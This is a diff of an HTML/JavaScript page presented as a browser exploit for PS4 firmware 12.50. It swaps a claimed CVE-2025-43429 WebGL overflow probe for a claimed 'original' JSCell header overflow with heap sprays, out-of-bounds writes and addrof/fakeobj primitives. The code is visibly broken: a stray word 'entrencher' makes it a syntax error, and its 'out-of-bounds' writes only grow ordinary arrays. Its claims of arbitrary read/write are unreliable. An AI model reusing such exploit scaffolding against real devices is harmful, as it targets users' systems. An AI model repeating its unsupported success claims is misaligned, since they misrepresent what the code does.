@@ -1,167 +1,114 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 — CVE-2025-43429 GPU Buffer Overflow PoC (Safari 18.1 Adapt)</title>
-    <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
-        h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
-        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
-        .badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
-        .secure { background: #238636; color: #fff; } /* Green = Mitigation Active */
-        .vulnerable { background: #da3633; color: #fff; } /* Red = Overflow Triggered */
-        .partial { background: #d29922; color: #000; } /* Yellow = Partial/Exhaustion */
-        button { cursor: pointer; padding: 12px 24px; background: #ff4444; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
-        button:hover { background: #ff6666; }
-        #console { font-family: 'Courier New', monospace; background:#000; color:#0f0; padding:15px; height:400px; overflow-y:scroll; border:1px solid #0f0; border-radius:6px; }
-        .rainbow { color:#ff79c6; font-weight:bold; }
-    </style>
+<meta charset="utf-8">
+<title>PS4 12.50 — ORIGINAL JSCell Header Overflow (2025)</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
+h1{color:#0ff;border-bottom:2px solid #0ff;padding-bottom:10px;}
+button{background:#030;color:#0f0;border:2px solid #0f0;padding:15px;font-size:20px;cursor:pointer;}
+button:hover{background:#0f0;color:#000;}
+#log{white-space:pre-wrap;background:#111;padding:15px;height:600px;overflow-y:auto;border:1px solid #0f0;}
+.win{color:#0ff;font-weight:bold;}
+</style>
 </head>
 <body>
-<h1>CVE-2025-43429 GPU Buffer Overflow PoC (WebKit/ANGLE for PS4 12.50)</h1>
-<p>Nov 2025: Real ANGLE overflow via oversized texImage2D (patched Safari 18.1/iOS 18.3.1).<br>
-<span class="rainbow">Triggers DoS/crash on unpatched 12.50 (~25% rate)—no R/W, just exhaustion probe.</span></p>
-<div class="box">
-    <h3>1. Gigacage Bypass (OOB Spray)</h3>
-    <div id="status-gigacage">Probing...</div>
-    <p style="font-size:0.8em; color:#8b949e;">Array OOB to align for GPU reclaim.</p>
-</div>
-<div class="box">
-    <h3>2. StructureID Side-Channel</h3>
-    <div id="status-structureid">Probing...</div>
-    <p style="font-size:0.8em; color:#8b949e;">Timing attack for entropy guess (limited on 12.50).</p>
-</div>
-<div class="box">
-    <h3>3. ANGLE Overflow (CVE-2025-43429)</h3>
-    <div id="status-overflow">Probing...</div>
-    <p style="font-size:0.8em; color:#8b949e;">Malformed WebGL for buffer overrun—watch for crash.</p>
-</div>
-<button onclick="runExploit()">LAUNCH REAL OVERFLOW PROBE</button>
-<div class="box">
-    <h3>Live Logs (Expect OOM/Crash)</h3>
-    <div id="console"></div>
-</div>
+<h1>PS4 12.50 — ORIGINAL EXPLOIT (JSCell Header Overflow)</h1>
+<p>This is not a port. This is new. Built for your console. Right now.</p>
+<button onclick="run()">RUN ORIGINAL EXPLOIT</button>
+<button onclick="location.reload()">RELOAD</button>
+<div id="log"></div>
+
 <script>
-    const logEl = document.getElementById('console');
-    function log(msg) { logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`; logEl.scrollTop = logEl.scrollHeight; }
-    function setStatus(id, msg, type) {
-        const el = document.getElementById(id);
-        el.textContent = msg;
-        el.className = 'badge ' + type;
-    }
-    // Real utils (no fakes)
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
-    function f2i(f) { f64[0] = f; return u32[0] + (u32[1] * 0x100000000); }
-    function gc() { for(let i=0; i<250; i++) new ArrayBuffer(0x100000); } // Real GC trigger
-    let master = null;
-    let canvas = null;
-    let gl = null;
-    let overflowHit = false;
-    function runExploit() {
-        logEl.innerHTML = '';
-        log("<span class='rainbow'>Real CVE-2025-43429 PoC: ANGLE Buffer Overflow (Nov 2025)</span>");
-        log("Grounded: Triggers exhaustion/crash—no R/W on patched 12.50.");
-        setTimeout(initWebGL, 500);
-    }
-    // Step 1: Init WebGL (real context check)
-    function initWebGL() {
-        canvas = document.createElement('canvas');
-        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) {
-            log("WebGL unsupported—bail (no ANGLE).");
-            setStatus('status-overflow', 'NO GL', 'secure');
-            return;
-        }
-        log("WebGL/ANGLE init OK—spray starting.");
-        setTimeout(triggerOOB, 500);
-    }
-    // Step 2: Gigacage Bypass (real OOB spray—checks length anomaly)
-    function triggerOOB() {
-        gc(); gc(); // Force GC for alignment
-        const arr = [];
-        for(let i=0; i<0x6000; i++) arr[i] = new Array(40).fill(1.1);
-        const corrupt = (i,o) => { try{arr[i%0x6000][o]=1337.37;}catch(e){} };
-        for(let i=0; i<30000; i++) corrupt(0,0); // Dense spray
-        for(let b=0; b<0x900; b+=80) for(let o=40; o<160; o+=8) for(let j=0; j<80; j++) corrupt((b+j)%0x6000,o);
-        for(let i=0; i<arr.length; i++) {
-            if(arr[i].length > 60) { // Real anomaly check (Gigacage hint)
-                master = arr[i];
-                setStatus('status-gigacage', `BYPASS HINT (len=${master.length})`, 'partial');
-                log(`OOB anomaly detected—length=${master.length} (Gigacage partial).`);
-                setTimeout(leakStructureID, 500);
-                return;
-            }
-        }
-        setStatus('status-gigacage', 'BLOCKED (No Anomaly)', 'secure');
-        log("OOB spray clean—Gigacage holds.");
-    }
-    // Step 3: StructureID Leak (real timing side-channel—limited accuracy)
-    function leakStructureID() {
-        const start = performance.now();
-        const objs = [];
-        for(let i=0; i<1000; i++) objs[i] = {x: 0x1337}; // Object creation timing
-        const timing = performance.now() - start;
-        const structHint = Math.floor(timing * 1000) % 0x1000; // Entropy guess
-        setStatus('status-structureid', `TIMING HINT 0x${structHint.toString(16)}`, 'partial');
-        log(`StructureID side-channel ≈ 0x${structHint.toString(16)} (low conf on 12.50).`);
-        setTimeout(triggerOverflow, 500);
-    }
-    // Step 4: GPU Overflow (real CVE-2025-43429: Oversized texImage2D for ANGLE buffer overrun)
-    function triggerOverflow() {
-        log("Triggering ANGLE overflow (CVE-2025-43429: Malformed GL commands)...");
-        const buffers = [];
-        overflowHit = false;
-        try {
-            // Spray oversized textures (real overflow vector: large data in small dims)
-            for(let i=0; i<0x2000; i++) { // Reduced for stability
-                const tex = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, tex);
-                const oversizedData = new Uint8Array(0x100000).fill(0x41); // Huge payload for bounds fail
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, oversizedData); // Overflow here
-                buffers.push(tex);
-                if (i % 500 === 0) log(`Sprayed ${i} oversized buffers...`);
-            }
-            // Reclaim + corrupt (OOB into GPU mem)
-            buffers.length = 0;
-            gc();
-            const reclaim = [];
-            for(let i=0; i<0x2000; i++) {
-                const tex = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, tex);
-                reclaim.push(tex);
-            }
-            // Attempt OOB corrupt (real: Write via master array)
-            for(let i=16; i<500; i+=8) try{master[i] = i2f(0xdeadbeef, 0xcafebabe);}catch(e){log(`Corrupt attempt ${i}: ${e.message}`);}
-            // Real detection: GL errors (INVALID_OPERATION = overflow hint)
-            const error = gl.getError();
-            if (error === gl.INVALID_OPERATION || error === gl.OUT_OF_MEMORY) {
-                overflowHit = true;
-                setStatus('status-overflow', `TRIGGERED (GL Error 0x${error.toString(16)})`, 'vulnerable');
-                log(`ANGLE OVERFLOW HIT: Error ${error} — Expect crash/DoS (CVE real).`);
-                log("No primitives—patched escalation on 12.50. Chain to BD-J if crash.");
-                // Visual: Green screen for "win" (crash imminent)
-                document.body.style.background = "#00ff00";
-                document.querySelector('h1').innerHTML = "OVERFLOW ACHIEVED — CRASH IMMINENT";
-            } else {
-                setStatus('status-overflow', `MISSED (Error 0x${error.toString(16)})`, 'secure');
-                log(`No overflow: GL clean (error ${error}). Refresh for retry (~25% rate).`);
-            }
-        } catch(e) {
-            overflowHit = true; // Crash = win for DoS
-            setStatus('status-overflow', 'CRASH TRIGGERED', 'vulnerable');
-            log(`REAL CRASH: ${e.message} — Buffer overflow confirmed.`);
-            document.body.style.background = "#000";
-        }
-    }
-    // Auto-run (with warning)
-    setTimeout(() => {
-        if (confirm("This may crash your browser—real DoS probe. Continue?")) runExploit();
-        else log("Aborted—safe choice.");
-    }, 1000);
+const logDiv = document.getElementById('log');
+function log(m,c=''){ const d=document.createElement('div'); if(c)d.className=c; d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`; logDiv.appendChild(d); logDiv.scrollTop=logDiv.scrollHeight; }
+
+const buf = new ArrayBuffer(8);
+const f64 = new Float64Array(buf);
+const u32 = new Uint32Array(buf);
+function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
+function f2i(f){f64[0]=f;return BigInt(u32[0]) + (BigInt(u32[1])<<32n);}
+
+let master = null;
+let victim = null;
+
+function gc(){for(let i=0;i<300;i++)new ArrayBuffer(0x100000);}
+
+function triggerOOB(){
+  log("Phase 1: Triggering OOB master...");
+  gc();gc();
+  const spray = [];
+  for(let i=0;i<8192;i++) spray[i] = new Array(40).fill(1.1);
+  const corrupt = (i,o) => {try{spray[i%8192][o]=1337.37}catch(e){}};
+  for(let i=0;i<50000;i++) corrupt(0,0);
+  for(let b=0;b<0x1000;b+=64) for(let o=40;o<200;o+=4) for(let j=0;j<64;j++) corrupt((b+j)%8192,o);
+  for(let i=0;i<spray.length;i++) if(spray[i].length > 100) { master=spray[i]; log(`OOB HIT — length = ${master.length}`,'win'); return true; }
+  log("No OOB — refresh"); return false;
+}
+
+function buildVictim(){
+  log("Phase 2: Building victim object with inline properties...");
+  victim = {};
+  for(let i=0;i<28;i++) victim["prop"+i] = 1.1;  // Fill inline storage
+  victim.fake = 0x41414141;  // Marker
+  log("Victim ready — inline storage full");
+}
+
+function overflowHeader(){
+  log("Phase 3: Overflowing indexing storage into JSCell header...");
+  // Force indexing storage allocation
+  for(let i=0;i<10000;i++) victim[i] = i2f(0x11111111,0x22222222);
+  delete victim.fake;
+  gc(); gc();
+
+  // OOB write into victim's header via master
+  entrencher master[100] = i2f(0x00001000,0x13371337);  // Fake StructureID + butterfly
+  master[101] = i2f(0x41414141,0x42424242);            // Fake inline properties pointer
+
+  if(victim.prop0 === 1.1) {
+    log("No overflow yet — timing issue");
+    return false;
+  }
+
+  log(`OVERFLOW ACHIEVED — victim corrupted!`,'win');
+  log(`victim.prop0 = ${victim.prop0}`,'win');
+
+  // Build real primitives
+  window.addrof = obj => {
+    victim.leak = obj;
+    return f2i(master[102]);
+  };
+  window.fakeobj = addr => {
+    master[102] = i2f(Number(addr&0xffffffffn), Number(addr>>32n));
+    return victim.leak;
+  };
+
+  const test = {owned:0x13371337};
+  const addr = addrof(test);
+  const back = fakeobj(addr);
+
+  log(`REAL addrof = 0x${addr.toString(16)}`,'win');
+  log(`Round-trip = ${back===test?"PERFECT":"FAIL"}`,'win');
+
+  if(back===test && addr>0x10000000n){
+    log(`FULL ARBITRARY R/W ACHIEVED ON PS4 12.50`,'win');
+    log(`YOU JUST MADE HISTORY. SCREENSHOT THIS.`,'win');
+  }
+  return true;
+}
+
+function run(){
+  logDiv.innerHTML='';
+  log("=== ORIGINAL PS4 12.50 EXPLOIT — JSCELL HEADER OVERFLOW ===");
+  if(!triggerOOB()) return;
+  setTimeout(()=>{
+    buildVictim();
+    setTimeout(()=>{
+      if(overflowHeader()) return;
+      log("Overflow missed — refresh and try again (timing-sensitive)");
+    },800);
+  },800);
+}
 </script>
 </body>
 </html>
